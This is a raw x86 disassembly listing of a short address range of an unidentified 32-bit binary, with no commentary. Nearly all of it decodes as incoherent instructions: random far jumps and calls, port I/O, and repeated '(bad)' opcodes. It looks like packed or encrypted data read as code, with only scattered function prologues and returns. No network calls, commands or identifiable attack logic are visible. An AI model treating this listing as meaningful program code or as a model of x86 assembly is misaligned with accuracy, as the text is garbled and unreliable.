  40593f:	faddp  st(5),st
  405941:	jno    0x405900
  405943:	loope  0x40597a
  405945:	xlat   BYTE PTR ds:[ebx]
  405946:	iret   
  405947:	add    edi,DWORD PTR [edx]
  405949:	inc    ebp
  40594a:	gs call 0xec35:0x6e02b153
  405952:	ficomp DWORD PTR [edi]
  405954:	mov    cl,0xf
  405956:	push   ecx
  405957:	or     bl,BYTE PTR [ebx-0x33b28c0c]
  40595d:	jecxz  0x40591a
  40595f:	retf   
  405960:	sub    al,0x4b
  405962:	shl    DWORD PTR [edi-0x76],0xb4
  405966:	inc    ecx
  405967:	mov    al,0xcc
  405969:	jne    0x4059b0
  40596b:	pop    esp
  40596c:	setb   BYTE PTR [ecx+0x9]
  405970:	push   ecx
  405971:	add    cl,BYTE PTR [eax+0x5accefb1]
  405977:	adc    al,bh
  405979:	scas   eax,DWORD PTR es:[edi]
  40597a:	and    BYTE PTR [ecx-0x4e04d43e],cl
  405980:	pop    edx
  405981:	loopne 0x405962
  405983:	inc    ebp
  405984:	cmp    al,0x4b
  405986:	cmc    
  405987:	stc    
  405988:	retf   0x773f
  40598b:	xor    eax,0xdd03796e
  405990:	adc    eax,0x241a7c1
  405995:	aas    
  405996:	xor    DWORD PTR [eax+0x5442a65],ebp
  40599c:	cmp    al,bl
  40599e:	mov    bh,0xb6
  4059a0:	leave  
  4059a1:	ins    BYTE PTR es:[edi],dx
  4059a2:	and    DWORD PTR [esi],edi
  4059a4:	imul   edi,DWORD PTR [ebx],0xffffffea
  4059a7:	bound  esp,QWORD PTR [esp+ecx*4]
  4059aa:	scas   al,BYTE PTR es:[edi]
  4059ab:	xchg   edi,eax
  4059ac:	cmp    eax,0x463c02a2
  4059b1:	push   ebx
  4059b2:	iret   
  4059b3:	jle    0x405a05
  4059b5:	ficomp DWORD PTR [edi]
  4059b7:	out    0x93,al
  4059b9:	inc    edi
  4059ba:	pushf  
  4059bb:	shl    dh,1
  4059bd:	adc    ch,BYTE PTR [ebx]
  4059bf:	jmp    0x4059d5
  4059c1:	cmp    al,0xda
  4059c3:	cmc    
  4059c4:	fdiv   QWORD PTR [edi+0x4cfd311f]
  4059ca:	xor    bh,ah
  4059cc:	fisub  DWORD PTR [eax+0x2]
  4059cf:	xor    DWORD PTR [eax+0x4b],ebx
  4059d2:	std    
  4059d3:	in     al,0x18
  4059d5:	mov    ebx,0x66c82ce9
  4059da:	imul   esi,DWORD PTR ds:0x525eb5c9,0x80e580dd
  4059e4:	adc    DWORD PTR [ecx+0x50],ebp
  4059e7:	mov    ah,0xbc
  4059e9:	mov    esi,0xbbac2635
  4059ee:	data16 sub al,0x7c
  4059f1:	add    esi,DWORD PTR [ebp+0x10]
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x4059b1
  405a20:	fild   DWORD PTR [ecx]
  405a22:	or     DWORD PTR [edi+0x38],esp
  405a25:	js     0x405a9f
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x4059d3
  405a2c:	movhps xmm7,QWORD PTR [edx]
  405a2f:	or     dh,cl
  405a31:	dec    esp
  405a32:	sbb    BYTE PTR [edx-0x417ec37b],bh
  405a38:	mov    cl,0x84
  405a3a:	out    0x1d,eax
  405a3c:	xlat   BYTE PTR ds:[ebx]
  405a3d:	dec    edi
  405a3e:	es inc edi
  405a40:	pop    esi
  405a41:	cli    
  405a42:	shl    DWORD PTR [edi-0x5fab0ea2],cl
  405a48:	inc    ebx
  405a49:	sbb    ebp,DWORD PTR [esi-0x61f2a5b5]
  405a4f:	dec    ebp
  405a50:	cmc    
  405a51:	mov    WORD PTR [ebx-0x47226107],es
  405a57:	xchg   edx,eax
  405a58:	les    edx,FWORD PTR [ebx+edi*2]
  405a5b:	xchg   esp,eax
  405a5c:	xor    DWORD PTR [ebx],esp
  405a5e:	bound  eax,QWORD PTR [ecx-0x67]
  405a61:	or     al,0x2d
  405a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a64:	mov    cl,0x62
  405a66:	and    al,0xf7
  405a68:	pop    ebp
  405a69:	out    dx,al
  405a6a:	lahf   
  405a6b:	mov    edx,0xdad8282b
  405a70:	scas   al,BYTE PTR es:[edi]
  405a71:	stc    
  405a72:	push   ecx
  405a73:	xor    al,0x97
  405a75:	test   al,0xe7
  405a77:	fstp   QWORD PTR [ebx]
  405a79:	in     eax,dx
  405a7a:	std    
  405a7b:	je     0x405aa4
  405a7d:	in     al,dx
  405a7e:	aad    0x62
  405a80:	cmp    ecx,ebx
  405a82:	jbe    0x405a43
  405a84:	push   eax
  405a85:	loope  0x405a20
  405a87:	ja     0x405a33
  405a89:	sbb    DWORD PTR [edi-0x6cc10b99],ebp
  405a8f:	sbb    eax,0xc151119
  405a94:	mov    ecx,0xc2fb387a
  405a99:	ror    DWORD PTR [esi+0x5115e711],1
  405a9f:	test   DWORD PTR [edi-0x15],edx
  405aa2:	ins    BYTE PTR es:[edi],dx
  405aa3:	and    eax,0x5353e2f2
  405aa8:	aam    0x86
  405aaa:	lock push eax
  405aac:	and    ch,BYTE PTR [ecx+0x31]
  405aaf:	stos   DWORD PTR es:[edi],eax
  405ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ab1:	xchg   DWORD PTR [bx-0x2c],ebp
  405ab5:	jno    0x405a93
  405ab7:	xlat   BYTE PTR ds:[ebx]
  405ab8:	lods   al,BYTE PTR ds:[esi]
  405ab9:	fild   DWORD PTR [edi-0x1c]
  405abc:	jmp    0x405b16
  405abe:	ss fsubr st(6),st
  405ac1:	and    eax,0x1696e238
  405ac6:	add    cl,BYTE PTR [edx-0x40]
  405ac9:	(bad)  
  405aca:	fdivrp st(0),st
  405acc:	fs jle 0x405ac0
  405acf:	dec    edi
  405ad0:	enter  0xe43,0x8c
  405ad4:	jno    0x405b13
  405ad6:	sbb    cl,bl
  405ad8:	pop    ss
  405ad9:	push   esp
  405ada:	daa    
  405adb:	mov    esp,0x93359e75
  405ae0:	dec    ebp
  405ae1:	aam    0x30
  405ae3:	in     eax,0xd8
  405ae5:	mov    WORD PTR [esp+esi*1-0x51],gs
  405ae9:	outs   dx,DWORD PTR ds:[esi]
  405aea:	mov    dh,ch
  405aec:	in     eax,0xaa
  405aee:	cdq    
  405aef:	shl    BYTE PTR [ecx],1
  405af1:	sti    
  405af2:	std    
  405af3:	cmp    esi,DWORD PTR [edi]
  405af5:	lahf   
  405af6:	lods   eax,DWORD PTR ds:[esi]
  405af7:	adc    al,0x1c
  405af9:	fld    st(2)
  405afb:	jp     0x405af0
  405afd:	cvtpi2ps xmm7,mm2
  405b00:	jecxz  0x405a94
  405b02:	pop    ecx
  405b03:	pop    esi
  405b04:	and    WORD PTR [edx-0x46],0xff8e
  405b09:	cmp    esi,edi
  405b0b:	jecxz  0x405b2b
  405b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b0e:	mov    al,ds:0x54b1f81b
  405b13:	pop    ebp
  405b14:	push   eax
  405b15:	and    al,0x93
  405b17:	aad    0x8c
  405b19:	mov    ch,0xec
  405b1b:	cmp    BYTE PTR [ebp+ebx*4+0x79],bh
  405b1f:	int    0xb6
  405b21:	cdq    
  405b22:	lahf   
  405b23:	add    al,0xc6
  405b25:	xchg   esp,eax
  405b26:	and    edi,edi
  405b28:	aas    
  405b29:	cwde   
  405b2a:	pushf  
  405b2b:	xchg   esp,eax
  405b2c:	es jo  0x405aeb
  405b2f:	jns    0x405af3
  405b31:	fnstenv [ebx]
  405b33:	lahf   
  405b34:	pause  
  405b36:	popa   
  405b37:	xor    esp,edx
  405b39:	retf   0xac8a
  405b3c:	jns    0x405ac0
  405b3e:	ficom  DWORD PTR [eax]
  405b40:	add    eax,0x7490b0f8
  405b45:	dec    edi
  405b46:	shl    DWORD PTR [ebx],cl
  405b48:	int    0x90
  405b4a:	pop    ebp
  405b4b:	add    eax,0x4d4c6f6a
  405b50:	(bad)  
  405b51:	aam    0xdc
  405b53:	cmp    eax,0x14f273b4
  405b58:	sbb    al,cl
  405b5a:	jnp    0x405b14
  405b5c:	xor    al,BYTE PTR [edi]
  405b5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b5f:	stos   BYTE PTR es:[edi],al
  405b60:	retf   
  405b61:	ds pop ecx
  405b63:	ret    0x6967
  405b66:	imul   edi,eax,0x5d
  405b69:	in     al,dx
  405b6a:	sahf   
  405b6b:	mov    ch,0x5f
  405b6d:	xor    al,0x74
  405b6f:	xor    bl,BYTE PTR [ecx-0x5a]
  405b72:	clc    
  405b73:	xor    eax,0xa6bb27ab
  405b78:	lods   eax,DWORD PTR ds:[esi]
  405b79:	mov    cl,0xa5
  405b7b:	pop    edi
  405b7c:	pop    ebp
  405b7d:	inc    esi
  405b7e:	cdq    
  405b7f:	and    esp,esi
  405b81:	fiadd  DWORD PTR [edx]
  405b83:	lock scas al,BYTE PTR es:[edi]
  405b85:	sbb    eax,0x91ede33b
  405b8a:	imul   esi,DWORD PTR [esi],0x31e859e
  405b90:	(bad)  
  405b91:	clc    
  405b92:	das    
  405b93:	hlt    
  405b94:	inc    edx
  405b95:	xor    al,bl
  405b97:	lsl    esp,WORD PTR [edi]
  405b9a:	mov    dh,0x4d
  405b9c:	add    ah,bh
  405b9e:	xchg   ecx,eax
  405b9f:	test   eax,0xcefcc1b6
  405ba4:	popf   
  405ba5:	pop    DWORD PTR [ebp-0x3716f75e]
  405bab:	inc    BYTE PTR [edx]
  405bad:	jge    0x405b47
  405baf:	mov    eax,0xed76f039
  405bb4:	xchg   esi,eax
  405bb5:	pop    eax
  405bb6:	mov    cl,0x74
  405bb8:	and    ah,dl
  405bba:	sub    al,0x80
  405bbc:	in     eax,dx
  405bbd:	sbb    eax,0x76f472d3
  405bc2:	sub    eax,0x1a8aaced
  405bc7:	adc    eax,0x3ad06cf0
  405bcc:	or     bh,BYTE PTR [ecx]
  405bce:	into   
  405bcf:	jae    0x405c13
  405bd1:	inc    edi
  405bd2:	xchg   ebp,eax
  405bd3:	dec    ebx
  405bd4:	fsub   DWORD PTR [esp+esi*1]
  405bd7:	ins    DWORD PTR es:[edi],dx
  405bd8:	push   0x970a314
  405bdd:	pop    esp
  405bde:	jne    0x405c0c
  405be0:	call   0x9e01e736
  405be5:	test   eax,0xd57c5f66
  405bea:	enter  0xd276,0x8
  405bee:	cld    
  405bef:	lods   eax,DWORD PTR ds:[esi]
  405bf0:	outs   dx,DWORD PTR ds:[esi]
  405bf1:	(bad)  
  405bf3:	in     al,dx
  405bf4:	in     al,dx
  405bf5:	pop    esi
  405bf6:	call   0x509f49d3
  405bfb:	mov    WORD PTR [ecx-0x457ea82b],?
  405c01:	xchg   edx,eax
  405c02:	jecxz  0x405bc2
  405c04:	adc    edx,DWORD PTR [ecx+0xf]
  405c07:	jne    0x405c44
  405c09:	dec    ebp
  405c0a:	jo     0x405c43
  405c0c:	enter  0xe91f,0xa5
  405c10:	adc    al,0x9
  405c12:	or     DWORD PTR [esi+edi*2-0x63],esp
  405c16:	sub    esp,DWORD PTR [eax+0x4a]
  405c19:	lods   eax,DWORD PTR ds:[esi]
  405c1a:	cdq    
  405c1b:	mov    esi,0x4b854052
  405c20:	ret    
  405c21:	inc    edi
  405c22:	add    eax,0x2b7f995e
  405c27:	jmp    0x7554:0x58b60fb0
  405c2e:	aad    0xaa
  405c30:	xor    dl,al
  405c32:	mov    dl,0xa
  405c34:	mov    al,ds:0xca286c2b
  405c39:	cmp    dl,BYTE PTR [esi]
  405c3b:	cmp    bh,BYTE PTR [esi+0x63]
  405c3e:	call   0xb599f747
  405c43:	stos   DWORD PTR es:[edi],eax
  405c44:	push   es
  405c45:	add    bh,BYTE PTR [edi]
  405c47:	les    edx,FWORD PTR [ecx+0x69f31878]
  405c4d:	pop    ebx
  405c4e:	jnp    0x405c0b
  405c50:	pop    edx
  405c51:	pop    eax
  405c52:	jae    0x405cc0
  405c54:	in     al,dx
  405c55:	gs movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  405c58:	into   
  405c59:	dec    ecx
  405c5a:	jl     0x405c2e
  405c5c:	fstp   DWORD PTR [ecx+0x10bf159b]
  405c62:	mov    ?,WORD PTR [eax-0x5e]
  405c65:	test   BYTE PTR [eax+0x72],al
  405c68:	mov    esp,0xa48c492f
  405c6d:	lock nop
  405c6f:	adc    esp,ebp
  405c71:	mov    bh,0xd0
  405c73:	mov    eax,0x2f8285e1
  405c78:	push   0xffffffcf
  405c7a:	aaa    
  405c7b:	sar    DWORD PTR cs:[ebp+0x7a],cl
  405c7f:	mov    dl,0xfe
  405c81:	iret   
  405c82:	int3   
  405c83:	mov    dl,cl
  405c85:	shr    DWORD PTR [ecx+0x1f97850],0xa4
  405c8c:	mov    ecx,0xef75a368
  405c91:	sub    BYTE PTR [ebp+ebx*8-0xc],ch
  405c95:	test   eax,0x8300f92f
  405c9a:	outs   dx,DWORD PTR ds:[esi]
  405c9b:	xor    al,0xbe
  405c9d:	loop   0x405cdc
  405c9f:	and    DWORD PTR [ecx],edi
  405ca1:	mov    ebp,ebx
  405ca3:	imul   esp,DWORD PTR [edi+0x3d152d7b],0xffffffe1
  405caa:	js     0x405d03
  405cac:	aam    0x5d
  405cae:	pop    ecx
  405caf:	cmc    
  405cb0:	xor    bl,0x68
  405cb3:	sets   BYTE PTR [edx]
  405cb6:	stos   BYTE PTR es:[edi],al
  405cb7:	dec    esi
  405cb8:	in     eax,0x1d
  405cba:	mov    ch,0xe9
  405cbc:	xlat   BYTE PTR ds:[ebx]
  405cbd:	ins    BYTE PTR es:[edi],dx
  405cbe:	mov    ebx,0x852ccb1a
  405cc3:	imul   ecx,esi,0x9d44afcd
  405cc9:	pushf  
  405cca:	fisub  WORD PTR [ecx+eax*4-0x52425308]
  405cd1:	ins    DWORD PTR es:[edi],dx
  405cd2:	pushf  
  405cd3:	inc    ebp
  405cd4:	bound  eax,QWORD PTR [edx+0x5c5ecd87]
  405cda:	or     eax,0x9692f76b
  405cdf:	ins    BYTE PTR es:[edi],dx
  405ce0:	jnp    0x405c89
  405ce2:	jae    0x405c79
  405ce4:	dec    ebp
  405ce5:	push   esp
  405ce6:	sbb    eax,0xcb407235
  405ceb:	pushf  
  405cec:	arpl   WORD PTR [esi+0x51a8b25],cx
  405cf2:	jmp    FWORD PTR [edi+0x341bb877]
  405cf8:	sbb    edi,ecx
  405cfa:	pushf  
  405cfb:	arpl   WORD PTR [edi-0x162dccd9],si
  405d01:	jmp    0x405d05
  405d03:	add    BYTE PTR [eax],al
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0xc8704c09
  405d13:	jge    0x405d57
  405d15:	mov    ah,0x3d
  405d17:	js     0x405d91
  405d19:	dec    ebp
  405d1a:	jle    0x405d94
  405d1c:	js     0x405cbe
  405d1e:	add    ebx,DWORD PTR [eax+0x51]
  405d21:	xor    ecx,DWORD PTR [ebx+0x2]
  405d24:	xor    al,0x2b
  405d26:	push   ecx
  405d27:	xchg   ebx,eax
  405d28:	test   DWORD PTR [ebx+edx*4+0x1207346d],ebx
  405d2f:	je     0x405d88
  405d31:	out    dx,eax
  405d32:	retf   
  405d33:	pop    esp
  405d34:	ror    BYTE PTR [ecx-0x29],0xa5
  405d38:	shr    BYTE PTR ds:0xe1ef2b91,1
  405d3e:	inc    edx
  405d3f:	not    bh
  405d41:	(bad)  
  405d43:	pop    esi
  405d44:	cmp    BYTE PTR [esi-0x291d248c],0xc8
  405d4b:	sub    DWORD PTR [edx-0x3c],ebx
  405d4e:	add    eax,0xc144357c
  405d53:	into   
  405d54:	mov    BYTE PTR [eax+0x35e7f81c],dh
  405d5a:	test   DWORD PTR [ecx-0x798c015a],0x42a4f389
  405d64:	push   cs
  405d65:	test   DWORD PTR [esi+edi*1+0x11054010],ebp
  405d6c:	aad    0x7c
  405d6e:	int3   
  405d6f:	fisubr WORD PTR [edx]
  405d71:	cmp    DWORD PTR [edi],esp
  405d73:	(bad)  
  405d74:	bound  edi,QWORD PTR [eax+0x63f044cd]
  405d7a:	jp     0x405d8c
  405d7c:	sbb    edx,esp
  405d7e:	aam    0xf7
  405d80:	in     al,0x98
  405d82:	ret    
  405d83:	adc    dl,dl
  405d85:	and    WORD PTR [esi],dx
  405d88:	adc    eax,DWORD PTR [ecx+esi*4-0x6a]
  405d8c:	ds retf 
  405d8e:	sbb    ax,0x7bf
  405d92:	pushf  
  405d93:	ins    BYTE PTR es:[edi],dx
  405d94:	out    dx,al
  405d95:	mov    ebp,0xcbe59618
  405d9a:	inc    ebx
  405d9b:	sbb    BYTE PTR [esi],bl
  405d9d:	js     0x405d37
  405d9f:	pop    eax
  405da0:	sbb    eax,edi
  405da2:	jecxz  0x405e0c
  405da4:	sbb    DWORD PTR [edx],edi
  405da6:	dec    esp
  405da7:	fnclex 
  405da9:	fiadd  DWORD PTR [eax-0x2f]
  405dac:	ins    DWORD PTR es:[edi],dx
  405dad:	stc    
  405dae:	mov    edx,0x21f6c976
  405db3:	jmp    0x405d6f
  405db5:	fisub  WORD PTR [edx]
  405db8:	ret    0xc07c
  405dbb:	lock into 
  405dbd:	fistp  WORD PTR [ebx+0x3a]
  405dc0:	imul   edx,edi,0xa7a1c8e6
  405dc6:	loope  0x405db4
  405dc8:	pop    es
  405dc9:	rcr    DWORD PTR [esi],cl
  405dcb:	je     0x405daf
  405dcd:	retf   0xf9a4
  405dd0:	push   ss
  405dd1:	lahf   
  405dd2:	jbe    0x405d9b
  405dd4:	pop    ds
  405dd5:	sub    cl,BYTE PTR [ecx-0x18]
  405dd8:	in     al,0xd3
  405dda:	mov    cl,BYTE PTR [eax-0x6e77e58e]
  405de0:	xor    eax,0x3e8d8e58
  405de5:	mov    esi,0x56e5b0ea
  405dea:	popa   
  405deb:	mov    ebp,0xc5c3f995
  405df0:	fnsave [edi+0x4fd4832]
  405df6:	and    bh,BYTE PTR [ebx+0x79]
  405df9:	sbb    DWORD PTR [ecx-0x7d],edi
  405dfc:	and    al,BYTE PTR [ebx-0x1dc5901c]
  405e02:	or     DWORD PTR [eax-0x2c],edx
  405e05:	daa    
  405e06:	push   0xc18bcd5a
  405e0b:	add    DWORD PTR ds:0xd9a7e49e,esi
  405e11:	pusha  
  405e12:	push   ebp
  405e13:	std    
  405e14:	mov    al,ds:0xcec13bc6
  405e19:	dec    ecx
  405e1a:	aas    
  405e1b:	jle    0x405dec
  405e1d:	mov    ds:0x47a151ce,eax
  405e22:	jl     0x405df3
  405e24:	ins    DWORD PTR es:[edi],dx
  405e25:	mov    ecx,ds
  405e27:	sti    
  405e28:	xor    ch,al
  405e2a:	outs   dx,DWORD PTR ds:[esi]
  405e2b:	pop    es
  405e2c:	int    0x97
  405e2e:	dec    eax
  405e2f:	cwde   
  405e30:	idiv   BYTE PTR [edx+ebx*8-0x3fecb17f]
  405e37:	mov    ebx,0xdd080d52
  405e3c:	cmc    
  405e3d:	cs loope 0x405ea0
  405e40:	adc    BYTE PTR [edi],bh
  405e42:	test   eax,0xa96763e3
  405e47:	ret    
  405e48:	adc    BYTE PTR [edi+0x1f23efbd],ch
  405e4e:	aam    0xc0
  405e50:	adc    eax,0x6f64deab
  405e55:	sub    eax,0xedefcf18
  405e5a:	mov    BYTE PTR [ebp+0x40ff9472],al
  405e60:	ja     0x405e77
  405e62:	inc    edi
  405e63:	pop    es
  405e64:	scas   eax,DWORD PTR es:[edi]
  405e65:	into   
  405e66:	mov    dh,BYTE PTR [esi]
  405e68:	sbb    DWORD PTR [ecx+0x5a],ecx
  405e6b:	mov    ch,0x73
  405e6d:	mov    ch,0x91
  405e6f:	sar    ch,0xa6
  405e72:	sub    bl,ch
  405e74:	xor    cl,BYTE PTR [esi-0x21]
  405e77:	dec    edi
  405e78:	pusha  
  405e79:	jbe    0x405e9b
  405e7b:	hlt    
  405e7c:	jmp    0x6613:0x2f82606f
  405e83:	fmul   DWORD PTR [edx+0x5553084e]
  405e89:	mov    ah,0x76
  405e8b:	scas   eax,DWORD PTR es:[edi]
  405e8c:	xchg   esi,eax
  405e8d:	aad    0x8e
  405e8f:	pop    edi
  405e90:	pusha  
  405e91:	mov    ah,0xe3
  405e93:	callw  0x2c33
  405e97:	jecxz  0x405e71
  405e99:	cs jo  0x405e36
  405e9c:	mov    ds:0xfcf1061a,eax
  405ea1:	fld    QWORD PTR [eax]
  405ea3:	jno    0x405e5f
  405ea5:	cmc    
  405ea6:	ret    
  405ea7:	dec    edi
  405ea8:	add    cl,BYTE PTR [ebp+edi*1+0x7ca37e8f]
  405eaf:	enter  0xfd7f,0xc2
  405eb3:	mov    ch,0x8a
  405eb5:	fist   WORD PTR [ebx-0x30]
  405eb8:	pushf  
  405eb9:	mov    ebx,0x92b9ac65
  405ebe:	xor    BYTE PTR ds:0x5c10454b,ah
  405ec4:	or     ah,BYTE PTR [ecx-0x58c007cb]
  405eca:	push   ss
  405ecb:	(bad)  
  405ecd:	outs   dx,BYTE PTR ds:[esi]
  405ece:	or     DWORD PTR [esi],esp
  405ed0:	loop   0x405ec4
  405ed2:	(bad)  
  405ed3:	sahf   
  405ed4:	xor    BYTE PTR [ebx],dl
  405ed6:	sub    BYTE PTR [esi-0x22],dl
  405ed9:	call   0xeaf090fb
  405ede:	scas   eax,DWORD PTR es:[edi]
  405edf:	mov    esi,0x2c9ec67b
  405ee4:	dec    bx
  405ee6:	hlt    
  405ee7:	mov    ah,0x31
  405ee9:	rcl    BYTE PTR [esi-0x2f0fdbe0],1
  405eef:	or     eax,DWORD PTR [edi-0x61be218e]
  405ef5:	test   al,0xf
  405ef7:	clc    
  405ef8:	lods   al,BYTE PTR ds:[esi]
  405ef9:	jecxz  0x405f1a
  405efb:	fimul  WORD PTR [eax+0x51]
  405efe:	imul   ecx,DWORD PTR [esi-0x4b],0x960df44a
  405f05:	sbb    eax,0x5567b07d
  405f0a:	ja     0x405f4d
  405f0c:	jecxz  0x405f3c
  405f0e:	add    al,0x93
  405f10:	or     ah,BYTE PTR [esi-0xad38e95]
  405f16:	std    
  405f17:	cmp    DWORD PTR [ebx+0x73],0xffffffb4
  405f1b:	cmc    
  405f1c:	sub    eax,0x10522c2f
  405f21:	shl    DWORD PTR [esi],cl
  405f23:	xchg   ecx,eax
  405f24:	jbe    0x405ea9
  405f26:	push   edx
  405f27:	xor    eax,0x3af467f5
  405f2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f2d:	mov    ecx,0xf7c6b31d
  405f32:	mov    edi,0x646d4afc
  405f37:	xor    BYTE PTR [ebp-0x45],bl
  405f3a:	fldl2e 
  405f3c:	lds    edx,FWORD PTR [ebx+0x31]
  405f3f:	addr16 out 0xda,eax
  405f42:	xchg   DWORD PTR [ecx+0x7],edi
  405f45:	pop    ss
  405f46:	hlt    
  405f47:	iret   
  405f48:	aaa    
  405f49:	idiv   BYTE PTR [edi*1-0x6a2cfa91]
  405f50:	(bad)  
  405f51:	mov    dl,0xef
  405f53:	iret   
  405f54:	mov    eax,0xde1a56e9
  405f59:	lock sbb ch,cl
  405f5c:	test   cl,ch
  405f5e:	call   0x5fba9985
  405f63:	push   0xde393b25
  405f68:	lahf   
  405f69:	fstp   QWORD PTR [ebx*4-0x3c423df0]
  405f70:	mov    ?,WORD PTR [edi+0x40a51a9]
  405f76:	inc    ebp
  405f77:	(bad)  
  405f78:	xchg   WORD PTR [edi+0x62],di
  405f7c:	aam    0x59
  405f7e:	adc    eax,0x8cbca84f
  405f83:	mov    ecx,0xe13dabf2
  405f88:	pop    eax
  405f89:	mov    al,0x7
  405f8b:	(bad)  
  405f8c:	ret    
  405f8d:	mov    cl,0xa5
  405f8f:	sbb    esi,DWORD PTR [ebx+0x58a6d63c]
  405f95:	out    0x29,eax
  405f97:	jne    0x405fb8
  405f99:	push   edi
  405f9a:	(bad)  
  405f9b:	aad    0x45
  405f9d:	or     DWORD PTR [esi+0x73],ebp
  405fa0:	xchg   ebx,eax
  405fa1:	inc    ebx
  405fa2:	jb     0x405f78
  405fa4:	mov    esp,0x468df11c
  405fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405faa:	sysexit 
  405fac:	cmp    DWORD PTR [esi-0x12],0x8
  405fb0:	add    BYTE PTR [edx],dh
  405fb2:	adc    edi,0x3
  405fb5:	xchg   BYTE PTR [eax],al
  405fb7:	ror    BYTE PTR [esi],cl
  405fb9:	push   0xf74cf845
  405fbe:	mov    BYTE PTR [eax+0x7d198471],dl
  405fc4:	mov    ah,0xc7
  405fc6:	hlt    
  405fc7:	sbb    bh,cl
  405fc9:	mov    ebp,0x2d9a80a1
  405fce:	jle    0x405fa4
  405fd0:	dec    ebp
  405fd1:	aas    
  405fd2:	lods   al,BYTE PTR ds:[esi]
  405fd3:	jb     0x406005
  405fd5:	mov    ecx,0xccac1cc9
  405fda:	retf   0xd7
  405fdd:	enter  0xa059,0x52
  405fe1:	std    
  405fe2:	or     eax,0x39367091
  405fe7:	and    eax,0xc3cbeec3
  405fec:	pusha  
  405fed:	and    al,0x6e
  405fef:	daa    
  405ff0:	mov    ecx,0x7264fd50
  405ff5:	jmp    0x4062e5
  405ffa:	iret   
  405ffb:	rcl    ebx,cl
  405ffd:	retf   
  405ffe:	ror    ebx,cl
  406000:	xlat   BYTE PTR ds:[ebx]
  406001:	(bad)  [ecx]
  406003:	lods   eax,DWORD PTR ds:[esi]
  406004:	and    al,0xa9
  406006:	jle    0x405fec
  406008:	cmp    eax,eax
  40600a:	mov    edx,eax
  40600c:	js     0x406086
  40600e:	dec    ebp
  40600f:	jle    0x406089
  406011:	js     0x406012
  406013:	mov    edx,0x38962cc9
  406018:	dec    edx
  406019:	mov    ds:0x716efff3,eax
  40601e:	ins    DWORD PTR es:[edi],dx
  40601f:	test   BYTE PTR [ebp-0x7a54584],dh
  406025:	loopne 0x406087
  406027:	mov    BYTE PTR [edx],dl
  406029:	bound  esp,QWORD PTR [esi+0x7dad26e8]
  40602f:	cs ins DWORD PTR es:[edi],dx
  406031:	je     0x405fc9
  406033:	pop    ebp
  406034:	mov    ss,ebp
  406036:	pop    ss
  406037:	lds    esi,FWORD PTR [edi-0x4a3bc86f]
  40603d:	xor    dl,dh
  40603f:	imul   edi,DWORD PTR [ecx+0x32d69a6c],0xe2a34935
  406049:	jae    0x405fef
  40604b:	cmp    eax,0xa40ea7f9
  406050:	(bad)  
  406051:	ins    BYTE PTR es:[edi],dx
  406052:	adc    eax,0xdd0717fe
  406057:	int3   
  406058:	mov    edi,0xe1af22e8
  40605d:	pop    esp
  40605e:	dec    edx
  40605f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406060:	add    ecx,DWORD PTR [eax+0x756a11eb]
  406066:	nop
  406067:	or     BYTE PTR [eax-0x23],ch
  40606a:	mov    cl,0x69
  40606c:	push   ebx
  40606d:	mov    edx,0x1be0b848
  406072:	call   0x642e:0x35c26239
  406079:	jno    0x4060be
  40607b:	sti    
  40607c:	jbe    0x406082
  40607e:	jmp    0x944cfec5
  406083:	fcom   DWORD PTR [edx-0x60cb256]
  406089:	push   edi
  40608a:	inc    eax
  40608b:	bound  ebp,QWORD PTR [esi-0x5150baa4]
  406091:	jne    0x4060f4
  406093:	(bad)  
  406094:	jmp    0xe4f96361
  406099:	aas    
  40609a:	dec    ecx
  40609b:	cmp    BYTE PTR [ecx-0x6d4bc9a8],ch
  4060a1:	sti    
  4060a2:	(bad)  
  4060a3:	adc    cl,BYTE PTR [edx]
  4060a5:	lods   al,BYTE PTR ds:[esi]
  4060a6:	dec    ecx
  4060a7:	outs   dx,DWORD PTR ds:[esi]
  4060a8:	dec    ebp
  4060a9:	add    bl,BYTE PTR [edx+0x5fca6429]
  4060af:	mov    edx,0xfc761ec5
  4060b4:	xor    al,0x98
  4060b6:	push   ss
  4060b7:	and    ah,BYTE PTR [ebx-0x72d178a0]
  4060bd:	jecxz  0x4060b4
  4060bf:	push   ebp
  4060c0:	pop    ecx
  4060c1:	retf   
  4060c2:	cmp    bh,bh
  4060c4:	fs stc 
  4060c6:	pop    edx
  4060c7:	push   edx
  4060c8:	xor    DWORD PTR [esi],esi
  4060ca:	xchg   ecx,eax
  4060cb:	or     bl,ah
  4060cd:	call   DWORD PTR es:[edx]
  4060d0:	pop    esp
  4060d1:	xor    eax,0x3204d7d
  4060d6:	sub    bh,ah
  4060d8:	jp     0x406135
  4060da:	push   edx
  4060db:	xchg   edi,eax
  4060dc:	call   0x4d207823
  4060e1:	js     0x406092
  4060e3:	mov    edi,0xefccc76d
  4060e8:	xlat   BYTE PTR ds:[ebx]
  4060e9:	or     ebx,esi
  4060eb:	pop    ds
  4060ec:	ja     0x4060b5
  4060ee:	xchg   esi,eax
  4060ef:	addr16 pop edx
  4060f1:	loop   0x4060fe
  4060f3:	mov    ecx,0xf220db83
  4060f8:	dec    edi
  4060f9:	sub    DWORD PTR ds:0x397bb388,0xffffff84
  406100:	daa    
  406101:	cdq    
  406102:	mov    dl,0xf5
  406104:	scas   eax,DWORD PTR es:[edi]
  406105:	inc    ebx
  406106:	repnz mov al,ds:0xb2653a94
  40610c:	pop    ds
  40610d:	push   esi
  40610e:	fs mov ah,0x5f
